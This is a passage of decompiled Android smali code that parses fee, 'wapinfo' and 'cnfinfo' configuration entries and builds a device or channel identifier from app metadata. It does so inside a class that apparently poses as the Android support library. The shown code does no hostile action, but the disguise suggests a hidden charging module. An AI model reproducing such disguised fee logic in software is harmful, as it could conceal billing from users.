    iput-object v0, v2, Landroid/support/v4/app/g;->x:[Ljava/lang/String;

    iget v0, v2, Landroid/support/v4/app/g;->t:I

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, v2, Landroid/support/v4/app/g;->y:[Ljava/lang/String;

    :cond_6
    :goto_4
    iget v0, v2, Landroid/support/v4/app/g;->t:I

    if-lt v1, v0, :cond_d

    const-string v0, "config_fee_wap="

    const-string v1, "\n"

    invoke-static {v3, v0, v1}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->z:I

    const-string v0, "config_fee_wapid="

    const-string v1, "\n"

    invoke-static {v3, v0, v1}, Landroid/support/v4/app/Support;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v0

    iput v0, v2, Landroid/support/v4/app/g;->A:I

    move-object v0, v2

    goto/16 :goto_0

    :cond_7
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "config_fee_item"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "=(.*?),\\[(.*?)\\]\\|\\[(.*?)\\]"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v7}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v4

    invoke-virtual {v4, v3}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    move-result v5

    if-eqz v5, :cond_8

    iget-object v5, v2, Landroid/support/v4/app/g;->e:[I

    invoke-virtual {v4, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v6

    aput v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->f:[Ljava/lang/String;

    invoke-virtual {v4, v7}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->g:[Ljava/lang/String;

    invoke-virtual {v4, v9}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v5, v0

    :cond_8
    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_1

    :cond_9
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "reminfo"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "=\\[(.*?)\\]\\|\\[(.*?)\\]\\[(.*?)\\]"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v7}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v4

    invoke-virtual {v4, v3}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    move-result v5

    if-eqz v5, :cond_a

    iget-object v5, v2, Landroid/support/v4/app/g;->i:[Ljava/lang/String;

    invoke-virtual {v4, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->j:[Ljava/lang/String;

    invoke-virtual {v4, v7}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->k:[Ljava/lang/String;

    invoke-virtual {v4, v9}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v5, v0

    :cond_a
    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_2

    :cond_b
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "cnfinfo"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "=\\[(.*?)\\]\\|\\[(.*?)\\]\\[(.*?)\\]\\[(.*?)\\]\\[(.*?)\\]\\|\\[(.*?)\\]\\[(.*?)\\]"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v7}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v4

    invoke-virtual {v4, v3}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    move-result v5

    if-eqz v5, :cond_c

    iget-object v5, v2, Landroid/support/v4/app/g;->m:[Ljava/lang/String;

    invoke-virtual {v4, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->n:[Ljava/lang/String;

    invoke-virtual {v4, v7}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->o:[Ljava/lang/String;

    invoke-virtual {v4, v9}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->p:[Ljava/lang/String;

    invoke-virtual {v4, v10}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->q:[I

    const/4 v6, 0x5

    invoke-virtual {v4, v6}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v6

    aput v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->r:[Ljava/lang/String;

    const/4 v6, 0x6

    invoke-virtual {v4, v6}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v5, v0

    iget-object v5, v2, Landroid/support/v4/app/g;->s:[Ljava/lang/String;

    const/4 v6, 0x7

    invoke-virtual {v4, v6}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v5, v0

    :cond_c
    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_3

    :cond_d
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v4, "wapinfo"

    invoke-direct {v0, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, "=\\[(.*?)\\]\\|\\[(.*?)\\]\\|\\[(.*?)\\]\\|\\[(.*?)\\]\\|\\[(.*?)\\]"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v7}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/regex/Matcher;->find()Z

    move-result v4

    if-eqz v4, :cond_e

    iget-object v4, v2, Landroid/support/v4/app/g;->u:[I

    invoke-virtual {v0, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v5

    aput v5, v4, v1

    iget-object v4, v2, Landroid/support/v4/app/g;->v:[I

    invoke-virtual {v0, v7}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Landroid/support/v4/app/Support;->c(Ljava/lang/String;)I

    move-result v5

    aput v5, v4, v1

    iget-object v4, v2, Landroid/support/v4/app/g;->w:[Ljava/lang/String;

    invoke-virtual {v0, v9}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v1

    iget-object v4, v2, Landroid/support/v4/app/g;->x:[Ljava/lang/String;

    invoke-virtual {v0, v10}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v1

    iget-object v4, v2, Landroid/support/v4/app/g;->y:[Ljava/lang/String;

    const/4 v5, 0x5

    invoke-virtual {v0, v5}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v4, v1

    :cond_e
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_4
.end method

.method public static d()Ljava/lang/String;
    .locals 3

    :try_start_0
    sget-object v0, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    const/16 v2, 0x80

    invoke-virtual {v1, v0, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    const-string v1, "PARAM_VTNAME"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    const-string v0, "VT_AD_NEED_PREV"

    goto :goto_0
.end method

.method public static e()Ljava/lang/String;
    .locals 3

    :try_start_0
    sget-object v0, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    const/16 v2, 0x80

    invoke-virtual {v1, v0, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    const-string v1, "PARAM_VTID"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    const-string v0, "1000"

    goto :goto_0
.end method

.method public static e(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public static f()Ljava/lang/String;
    .locals 4

    :try_start_0
    sget-object v0, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    const/16 v2, 0x80

    invoke-virtual {v1, v0, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    const-string v1, "PARAM_SVID"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v0

    const-string v1, "%02d"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    aput-object v0, v2, v3

    invoke-static {v1, v2}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    const-string v0, "01"

    goto :goto_0
.end method

.method public static g()Ljava/lang/String;
    .locals 7

    const/16 v6, 0x46

    const/4 v5, 0x0

    sget-object v0, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    invoke-static {v0}, Landroid/support/v4/app/f;->b(Landroid/content/Context;)Landroid/support/v4/app/f;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "T#"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/support/v4/app/f;->d()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/support/v4/app/Support;->e()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/support/v4/app/Support;->f()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "000000000010100"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "v1019"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "0000%04d%04d"

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/Object;

    invoke-virtual {v0}, Landroid/support/v4/app/f;->e()I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v3, v5

    const/4 v4, 0x1

    invoke-virtual {v0}, Landroid/support/v4/app/f;->f()I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    aput-object v0, v3, v4

    invoke-static {v2, v3}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/support/v4/app/Support;->d()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-le v1, v6, :cond_0

    invoke-virtual {v0, v5, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    :cond_0
    return-object v0
.end method
